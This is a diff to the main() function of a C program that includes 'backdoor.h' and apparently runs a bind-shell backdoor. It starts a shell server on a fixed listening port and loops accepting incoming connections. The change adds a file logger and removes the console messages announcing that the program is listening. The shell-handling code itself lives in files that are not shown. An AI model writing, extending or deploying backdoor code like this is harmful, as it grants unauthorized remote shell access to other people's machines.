@@ -1,26 +1,27 @@
 #include <stdio.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <unistd.h>
-#include <netinet/in.h>
-#include <netinet/ip.h>
-#include <arpa/inet.h>
 #include <stdbool.h>
 #include <fcntl.h>
 #include <string.h>
 
-#include "shell.h"
 #include "common.h"
+#include "shell.h"
+#include "logger.h"
 #include "backdoor.h"
 
 
 int main(void)
 {
     return_code_t result = RC_UNINITIAILIZED;
+    logger__log_t logger = {0};
     int32_t shell_server = -1;
     int32_t temp_result = -1;
 
-    result = shell__init_server(SHELL_LISTENING_PORT, &shell_server);
+    result = logger__init_logger(LOG_PATH, &logger);
+    if (RC_SUCCESS != result){
+        goto l_cleanup;
+    }
+
+    result = shell__init_server(SHELL_LISTENING_PORT, &logger, &shell_server);
     if (RC_SUCCESS != result){
         goto l_cleanup;
     }
@@ -31,17 +32,16 @@ int main(void)
         handle_perror("Fcntl failed", RC_BACKDOOR__MAIN__FCNTL_FAILED);
     }
 
-    printf("Started to listen for connections on port: %d\n", SHELL_LISTENING_PORT);
     while (true){
-        result = shell__handle_new_connection(shell_server);
+        result = shell__handle_new_connection(shell_server, &logger);
         if (RC_SUCCESS != result){
             break;
         }
     }
 
-    printf("Stops listening for new connections.\n");
 l_cleanup:
-    shell__destroy_server(&shell_server);
+    shell__destroy_server(&shell_server, &logger);
+    logger__destory_logger(&logger);
     
     return (int)result;
 }
